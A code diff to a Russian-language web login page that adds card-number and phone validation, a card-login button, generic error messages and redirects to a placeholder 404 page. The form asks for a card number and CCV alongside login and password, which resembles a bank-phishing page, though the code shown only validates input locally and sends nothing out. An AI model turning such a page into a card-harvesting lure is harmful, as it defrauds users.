@@ -216,6 +216,7 @@
         <div class="form-group">
           <input type="number" placeholder="CCV" max="999" min="100">
         </div>
+        <button id="card-login-btn">Войти</button>
       `;
       document.querySelector("form").insertBefore(cardFieldsContainer, rememberContainer);
 
@@ -231,7 +232,6 @@
             noCardText.classList.add("hidden");
             cardFieldsContainer.classList.remove("hidden");
           } else if (index === 1) {
-            // Для телефона
             loginInput.placeholder = "Введите телефон";
             formGroups.forEach(group => group.classList.remove("hidden"));
             rememberContainer.classList.remove("hidden");
@@ -243,7 +243,7 @@
             loginButton.classList.remove("hidden");
             noCardText.classList.remove("hidden");
             cardFieldsContainer.classList.add("hidden");
-            loginInput.placeholder = "Введите логин"; // Вернуть placeholder для логина
+            loginInput.placeholder = "Введите логин";
           }
         });
       });
@@ -256,15 +256,20 @@
         const cardNumber = document.getElementById("card-number")?.value.trim() || "";
 
         if (!login || !password) {
-          errorMessage.textContent = 'Логин и пароль не могут быть пустыми!';
+          errorMessage.textContent = 'Неверный логин или пароль. Попробуйте еще раз.';
           loginInput.value = ""; // Очистить поле логин
           passwordInput.value = ""; // Очистить поле пароль
           return;
         }
 
+        if (tabs[1].classList.contains("active") && !/^\+?[0-9]{10,15}$/.test(login)) {
+          errorMessage.textContent = 'Неверный номер телефона или пароль. Попробуйте еще раз.';
+          return;
+        }
+
         if (cardFieldsContainer.classList.contains("hidden") && cardNumber) {
           if (!/^\d{16}$/.test(cardNumber)) {
-            errorMessage.textContent = 'Номер карты должен состоять из 16 цифр!';
+            errorMessage.textContent = 'Неправильный номер карты. Повторите попытку.';
             return;
           }
         }
@@ -288,11 +293,24 @@
         });
       });
 
-      // Кнопки для перехода на 404 страницы
-      document.querySelectorAll('.report-button').forEach(button => {
-        button.addEventListener('click', () => {
+      // Обработчик для кнопок "Вход по QR-коду" и "Вход по коду"
+      document.querySelectorAll('.auth-option').forEach(option => {
+        option.addEventListener('click', () => {
           window.location.href = 'https://example.com/404'; // Страница 404
         });
+      });
+
+      // Обработчик для кнопки входа с номером карты
+      document.getElementById("card-login-btn")?.addEventListener('click', function () {
+        errorMessage.textContent = ''; // Очистить ошибки
+        const cardNumber = document.getElementById("card-number").value.trim();
+
+        if (!/^\d{16}$/.test(cardNumber)) {
+          errorMessage.textContent = 'Неправильный номер карты. Повторите попытку.';
+          return;
+        }
+
+        alert("Номер карты введен корректно!");
       });
     });
   </script>
